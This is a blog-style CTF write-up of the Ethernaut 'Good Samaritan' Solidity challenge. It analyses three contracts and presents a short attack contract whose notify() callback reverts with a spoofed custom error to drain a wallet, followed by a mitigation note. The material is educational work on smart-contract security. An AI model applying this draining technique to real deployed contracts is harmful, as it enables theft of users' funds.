---
title: How Not To Use Custom Errors
date:  2022-11-06 12:30:06
author: Vishvesh
author_url: https://twitter.com/The_Str1d3r
mathjax: true
categories:
  - Blockchain
  - CTF-Writeups
tags:
  - "Ethereum"
  - "Solidity"

url : https://hackmd.io/Cyo2eYrKQPSvN3Zp8pga9g?view
mermaid: true
---
<html>
  <head>
    <script type="text/javascript" async
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>


<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS_HTML">
  MathJax.Hub.Config({
    "HTML-CSS": {
      availableFonts: ["TeX"],
    },
    tex2jax: {
      inlineMath: [['$','$'],["\\(","\\)"]]},
      displayMath: [ ['$$','$$'], ['\[','\]'] ],
    TeX: {
      extensions: ["AMSmath.js", "AMSsymbols.js", "color.js"],
      equationNumbers: {
        autoNumber: "AMS"
      }
    },
    showProcessingMessages: false,
    messageStyle: "none",
    imageFont: null,
    "AssistiveMML": { disabled: true }
  });
</script>
</head>
</html>

------
# Good Samaritan

## Overview

This challenge focuses on a relatively new feature introduced recently in solidity known as custom errors used for better error handling. The challenge is comprised of 3 smart contracts 
- GoodSamaritan
- Coin
- Wallet

GoodSamaritian is the main contract we ned to exploit. It holds a million token intially and gives out 10 tokens to anyone who requests it, our goal is to drain the contract of all of its token.

---
Lets have a look at the this contract...

### GoodSamaritian

```solidity
contract GoodSamaritan {
    
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}
```

The constructor sets the wallet and coin contract deposits the tokens into the wallet.

The `requestDonation()` function calls a function in the wallet contract which transfers the requester 10 tokens but we see that if the error regarding balances is encounterd the wallet transfers all of its funds present in it. This is what we ned to execute to drain the walet of al tokens.

Lets have look at coin and then wallet contracts...

### Coin

```solidity
contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}
```

The constructor intializes the wallet with 1 million coins and we can see that the contract defines a custom error called `InsufficientBalance()`.

The transfer function is intresting, allthough it performs the standard addition and subtraction classic of any normal transfer function the next part is whats out of ordinary as it sends out a notification to the contract that `amount` money has been transferred.

This opens an attack vector for us as if we request via a contract it will pass `dest_.isContract()` check if we define a `notify()` function in our contract that will be called inside which we can take over control flow.

Now looking at wallet contract...

### Wallet

```solidity
contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}
```

This contract defines the donate10() function which checks if the wallet has enough balance else it reverts with the error NotEnoughBalance() this is the erro we need to execute to trigger the trasferRemainder() function declared in this contract which trnasfers all remaing wallet fund to the ***_dest*** address.

Also note both `donate10()` and `transferRemainder()` fucntions are guarded by the `onlyOwner()` modifer hence only the contract owner in this case the `GoodSamaritian` can call them.

## Constructing the exploit

Ok now all the contracts have been analyzed this gives us an idea on how to proceed further...

- First we need to request the `GoodSamaritian` contract, this will execute the `requestDonation()` function.
- This in turn calls the `donate10()` fucntion which checks for balance and as at this time the wallet will have enough balance it will pass the check.
- Next the `transfer()` fucntion will be called in `Coin` contract, this will transfer 10 coins to our contracts address but then the `notify()` fucntion will be called on our contract.
- We should have the `notify()` function defined in our contract and inside this we will exceute the revert with the error `NotEnoughBalance()`.
- This revert will then trigger the catch expression in `requestDonation()` with the error message as `NotEnoughBalance()`.
- This will pass the check for the custom error and finally the `transferRemainder()` function wil be called and all wallet funds will be transferred to our contract.

## Exploit

This will be the final exploit...

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(_GoodSamaritianAddress); //ethernaut instance address
    
    function exploitGoodSamaritian() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```

This contract is the attack contract.

- First we will call the `exploitGoodSamaritian()` function which will call the `requestDoantion(`) function and as this is the first time all checks pass and 10 coins will be trnasferrred and the `notif()` function will be called.
- Insdie notify we have declared the revert statement with desired error which will trigger the `tranferRemnainder()` function to be called.
- But one catch is while transferring the entire wallet funds again the same process happens and again `notify()` will be called this willl result in our transfer being repeatedly reverted.
- To counter that the check is put: `amount <= 10`, so that when the entire amount is transferred the revert statement is not executed.


## Mitigation

In order to avoid this instead of notifying in that manner maybe events can be used, the essential thing is not to give away control flow to an external party and then deciding critical (or for that manner any) contract functionality based upon any parameter that the external party could potentially tamper with.
